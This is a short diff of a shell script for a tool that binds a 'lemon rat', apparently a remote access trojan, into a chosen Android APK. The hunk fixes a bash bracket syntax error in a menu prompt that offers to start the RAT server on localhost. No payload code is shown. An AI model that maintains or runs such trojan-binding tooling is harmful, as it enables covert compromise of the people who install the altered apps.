@@ -31,7 +31,7 @@ PWD=$(pwd)
 printf "\e[\e[1;34;40m In order to bind lemon rat in your desired apk file you must have created a lemon rat previously\e[0m\n"
 printf "\e[4;97mCSF \e[0;0;0m> \e[1;96;40m IF YOU HAVE ALREADY CREATED A LEMON RAT THEN PRESS ENTER TO CONTINUE ELSE PRESS 'y' to start the server of lemon\e[0m__"
 read choice
-if [[ $choice == 'y' || $choice == 'Y']]
+if [[ $choice == 'y' || $choice == 'Y' ]]
 then
 echo
 printf "\e[1;97;40m SERVER OF LEMON (url:- http://localhost:22533/) IS STARTING ....\e[0m\n"
